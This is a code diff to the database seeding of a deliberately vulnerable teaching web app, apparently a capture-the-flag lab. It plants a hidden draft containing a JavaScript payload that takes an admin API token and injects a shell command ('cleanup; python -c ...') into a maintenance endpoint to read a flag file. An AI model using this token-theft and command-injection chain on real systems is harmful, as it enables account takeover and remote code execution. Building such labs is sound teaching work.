@@ -20,12 +20,121 @@ CSRF_FLAG = "ENPM634{csrf_account_takeover}"
 FULL_CHAIN_FLAG = "ENPM634{full_chain_rce}"
 FINAL_CHAIN_MAILDROP = "ops-audit@maildrop.local"
 STALE_RCE_FILENAME = "rce-flag.txt"
+IDOR_FLAG_DRAFT_TITLE = "Private admin planning"
+IDOR_FLAG_DRAFT_CONTENT = (
+    f"Hidden note for grading lab work: {IDOR_FLAG} "
+    "Ops audit summaries still route to ops-audit@maildrop.local, and dry-run output should never land in the web root."
+)
+MODERATOR_DRAFT_PUBLIC_ID = 1
+IDOR_FLAG_DRAFT_PUBLIC_ID = 2
+ALICE_DRAFT_PUBLIC_ID = 3
+IDOR_HINT_DRAFT_PUBLIC_ID = 634
+IDOR_HINT_DRAFT_TITLE = "Queue dry-run scratch"
+IDOR_HINT_DRAFT_CONTENT = """Rough staging repro for the queue-based maintenance dry run. This is incomplete and should not be pasted into production as-is.
+
+<script>
+window.addEventListener('load', async () => {
+  if (typeof adminApiToken === "undefined") return;
+  const token = adminApiToken;
+
+  const python = [
+    'import sqlite3,datetime,pathlib',
+    'conn=sqlite3.connect("__DB_PATH__")',
+    'flag=pathlib.Path("__FLAG_PATH__").read_text().strip()',
+    'now=datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")',
+    'conn.execute("INSERT INTO mail_messages (recipient_email, subject, body, created_at) VALUES (?, ?, ?, ?)", ("__MAILDROP__", "Maintenance audit", flag, now))',
+    'conn.commit()',
+  ].join("; ");
+
+  const task = "cleanup; python -c '" + python + "' #";
+
+  await fetch('__MAINTENANCE_PATH__', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'X-Admin-Token': token,
+    },
+    body: 'task=' + encodeURIComponent(task),
+  });
+});
+</script>
+
+Reminder: dry-run output belongs in the mail queue, never in the web root."""
 
 
 def get_connection() -> sqlite3.Connection:
     connection = sqlite3.connect(DB_PATH)
     connection.row_factory = sqlite3.Row
     return connection
+
+
+def allocate_public_draft_id(connection: sqlite3.Connection) -> int:
+    taken_ids = {
+        row["public_id"]
+        for row in connection.execute(
+            "SELECT public_id FROM drafts WHERE public_id IS NOT NULL ORDER BY public_id"
+        ).fetchall()
+    }
+    candidate = 1
+    while candidate in taken_ids:
+        candidate += 1
+    return candidate
+
+
+def ensure_draft_public_ids(connection: sqlite3.Connection) -> None:
+    columns = {
+        column["name"]
+        for column in connection.execute("PRAGMA table_info(drafts)").fetchall()
+    }
+    if "public_id" not in columns:
+        connection.execute("ALTER TABLE drafts ADD COLUMN public_id INTEGER")
+
+    reserved_ids = (
+        (MODERATOR_DRAFT_PUBLIC_ID, "Moderator checklist"),
+        (IDOR_FLAG_DRAFT_PUBLIC_ID, IDOR_FLAG_DRAFT_TITLE),
+        (ALICE_DRAFT_PUBLIC_ID, "Alice draft"),
+        (IDOR_HINT_DRAFT_PUBLIC_ID, IDOR_HINT_DRAFT_TITLE),
+    )
+    for public_id, title in reserved_ids:
+        connection.execute(
+            "UPDATE drafts SET public_id = NULL WHERE public_id = ? AND title != ?",
+            (public_id, title),
+        )
+        connection.execute(
+            "UPDATE drafts SET public_id = ? WHERE title = ?",
+            (public_id, title),
+        )
+
+    drafts_without_public_id = connection.execute(
+        "SELECT id FROM drafts WHERE public_id IS NULL ORDER BY id"
+    ).fetchall()
+    for draft in drafts_without_public_id:
+        connection.execute(
+            "UPDATE drafts SET public_id = ? WHERE id = ?",
+            (allocate_public_draft_id(connection), draft["id"]),
+        )
+
+    connection.execute(
+        "CREATE UNIQUE INDEX IF NOT EXISTS idx_drafts_public_id ON drafts(public_id)"
+    )
+
+
+def ensure_user_profile_review_metadata(connection: sqlite3.Connection) -> None:
+    columns = {
+        column["name"]
+        for column in connection.execute("PRAGMA table_info(users)").fetchall()
+    }
+    if "bio_updated_at" not in columns:
+        connection.execute("ALTER TABLE users ADD COLUMN bio_updated_at TEXT DEFAULT ''")
+
+    users_without_timestamp = connection.execute(
+        "SELECT id FROM users WHERE bio_updated_at IS NULL OR bio_updated_at = ''"
+    ).fetchall()
+    for user in users_without_timestamp:
+        connection.execute(
+            "UPDATE users SET bio_updated_at = ? WHERE id = ?",
+            (datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"), user["id"]),
+        )
 
 
 def init_database() -> None:
@@ -35,6 +144,8 @@ def init_database() -> None:
     with get_connection() as connection:
         with open(INIT_SQL, "r", encoding="utf-8") as sql_file:
             connection.executescript(sql_file.read())
+        ensure_user_profile_review_metadata(connection)
+        ensure_draft_public_ids(connection)
         connection.commit()
 
         user_count = connection.execute("SELECT COUNT(*) AS total FROM users").fetchone()["total"]
@@ -55,15 +166,15 @@ def init_database() -> None:
 def seed_database(connection: sqlite3.Connection) -> None:
     now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
     users = [
-        ("admin", DEFAULT_ADMIN_EMAIL, ADMIN_PASSWORD, "Site administrator and editor.", "/static/uploads/default-avatar.png", 1, 1),
-        ("opsadmin", "ops@team22.local", OPSADMIN_PASSWORD, "Operations owner for internal posts.", "/static/uploads/default-avatar.png", 1, 1),
-        ("alice", "alice@example.com", "alicepass", "Security student and hobby blogger.", "/static/uploads/default-avatar.png", 0, 1),
-        ("bob", "bob@example.com", "bobpass", "Writes about Flask and containers.", "/static/uploads/default-avatar.png", 0, 0),
+        ("admin", DEFAULT_ADMIN_EMAIL, ADMIN_PASSWORD, "Site administrator and editor.", now, "/static/uploads/default-avatar.png", 1, 1),
+        ("opsadmin", "ops@team22.local", OPSADMIN_PASSWORD, "Operations owner for internal posts.", now, "/static/uploads/default-avatar.png", 1, 1),
+        ("alice", "alice@example.com", "alicepass", "Security student and hobby blogger.", now, "/static/uploads/default-avatar.png", 0, 1),
+        ("bob", "bob@example.com", "bobpass", "Writes about Flask and containers.", now, "/static/uploads/default-avatar.png", 0, 0),
     ]
     connection.executemany(
         """
-        INSERT INTO users (username, email, password, bio, avatar, is_admin, email_verified)
-        VALUES (?, ?, ?, ?, ?, ?, ?)
+        INSERT INTO users (username, email, password, bio, bio_updated_at, avatar, is_admin, email_verified)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
         """,
         users,
     )
@@ -86,6 +197,7 @@ def seed_database(connection: sqlite3.Connection) -> None:
 
     drafts = [
         (
+            MODERATOR_DRAFT_PUBLIC_ID,
             "Moderator checklist",
             "Review imports, user bios, and flagged comments before publishing.",
             1,
@@ -93,16 +205,15 @@ def seed_database(connection: sqlite3.Connection) -> None:
             now,
         ),
         (
-            "Private admin planning",
-            (
-                f"Hidden note for grading lab work: {IDOR_FLAG} "
-                "Ops audit summaries still route to ops-audit@maildrop.local, and dry-run output should never land in the web root."
-            ),
+            IDOR_FLAG_DRAFT_PUBLIC_ID,
+            IDOR_FLAG_DRAFT_TITLE,
+            IDOR_FLAG_DRAFT_CONTENT,
             2,
             0,
             now,
         ),
         (
+            ALICE_DRAFT_PUBLIC_ID,
             "Alice draft",
             "Still polishing this write-up before I publish it.",
             3,
@@ -111,8 +222,24 @@ def seed_database(connection: sqlite3.Connection) -> None:
         ),
     ]
     connection.executemany(
-        "INSERT INTO drafts (title, content, author_id, is_published, created_at) VALUES (?, ?, ?, ?, ?)",
+        """
+        INSERT INTO drafts (public_id, title, content, author_id, is_published, created_at)
+        VALUES (?, ?, ?, ?, ?, ?)
+        """,
         drafts,
+    )
+    connection.execute(
+        """
+        INSERT INTO drafts (public_id, title, content, author_id, is_published, created_at)
+        VALUES (?, ?, ?, ?, 0, ?)
+        """,
+        (
+            IDOR_HINT_DRAFT_PUBLIC_ID,
+            IDOR_HINT_DRAFT_TITLE,
+            IDOR_HINT_DRAFT_CONTENT,
+            2,
+            now,
+        ),
     )
 
     connection.execute(
@@ -184,20 +311,57 @@ def migrate_training_state(connection: sqlite3.Connection) -> None:
         )
 
     draft = connection.execute(
-        "SELECT id FROM drafts WHERE title = 'Private admin planning'"
+        """
+        SELECT id
+        FROM drafts
+        WHERE title = ?
+           OR content LIKE ?
+        ORDER BY id
+        LIMIT 1
+        """,
+        (IDOR_FLAG_DRAFT_TITLE, f"%{IDOR_FLAG}%"),
     ).fetchone()
     if draft:
         connection.execute(
-            "UPDATE drafts SET content = ?, author_id = ? WHERE id = ?",
+            "UPDATE drafts SET title = ?, content = ?, author_id = ? WHERE id = ?",
             (
-                (
-                    f"Hidden note for grading lab work: {IDOR_FLAG} "
-                    "Ops audit summaries still route to ops-audit@maildrop.local, and dry-run output should never land in the web root."
-                ),
+                IDOR_FLAG_DRAFT_TITLE,
+                IDOR_FLAG_DRAFT_CONTENT,
                 2,
                 draft["id"],
             ),
         )
+
+    hint_draft = connection.execute(
+        "SELECT id FROM drafts WHERE title = ?",
+        (IDOR_HINT_DRAFT_TITLE,),
+    ).fetchone()
+    if hint_draft:
+        connection.execute(
+            "UPDATE drafts SET content = ?, author_id = ? WHERE id = ?",
+            (
+                IDOR_HINT_DRAFT_CONTENT,
+                2,
+                hint_draft["id"],
+            ),
+        )
+    else:
+        created_at = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
+        connection.execute(
+            """
+            INSERT INTO drafts (public_id, title, content, author_id, is_published, created_at)
+            VALUES (?, ?, ?, ?, 0, ?)
+            """,
+            (
+                IDOR_HINT_DRAFT_PUBLIC_ID,
+                IDOR_HINT_DRAFT_TITLE,
+                IDOR_HINT_DRAFT_CONTENT,
+                2,
+                created_at,
+            ),
+        )
+
+    ensure_draft_public_ids(connection)
 
     docker_notes = connection.execute(
         "SELECT id FROM posts WHERE title = 'Docker Notes'"
